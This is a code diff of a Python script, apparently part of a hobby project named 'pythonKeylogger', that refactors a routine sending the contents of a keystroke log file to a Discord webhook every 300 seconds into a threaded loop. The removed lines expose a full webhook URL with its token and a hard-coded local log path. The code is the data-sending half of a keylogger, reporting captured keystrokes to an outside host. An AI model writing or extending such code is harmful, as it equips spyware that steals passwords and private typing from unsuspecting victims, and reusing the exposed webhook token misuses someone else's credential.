@@ -4,13 +4,8 @@ import os
 import datetime
 import time
 
-webhook_URL = "https://discord.com/api/webhooks/1440389519353319504/PQr2nuK1QRvsQLsA3vBOs1mF4JgGDIqkYym5QpSBLJUOZCNBZdpASx9nP0Ynu3Nwktop"
 
-caminho_log = "C:/Users/Bruno/Desktop/projetos/pythonKeylogger/log.txt"
-
-titulo = "Pele Jhonson"
-
-def enviar_para_discord(caminho_log, webhook_URL, titulo):
+def enviar_para_discord(caminho_log, webhook_URL, nome):
     if not os.path.exists(caminho_log):
         print(f"ERRO: Arquivo não encontrado no caminho: {caminho_log}")
         return
@@ -34,7 +29,7 @@ def enviar_para_discord(caminho_log, webhook_URL, titulo):
 
     payload = {
         "content": discord_mensage,
-        "username": titulo
+        "username": nome
     }
 
     headers = {
@@ -53,8 +48,9 @@ def enviar_para_discord(caminho_log, webhook_URL, titulo):
         print(f"ERRO na requisição HTTP: {e}")
 
 
-segundos = 300 
+def loop_do_envio(caminho_log, webhook_URL, nome, segundos):
+    print("thread de envio")
+    while True:
+        enviar_para_discord(caminho_log, webhook_URL, nome)
+        time.sleep(segundos)
 
-while True:
-    enviar_para_discord(caminho_log, webhook_URL, titulo)
-    time.sleep(segundos)
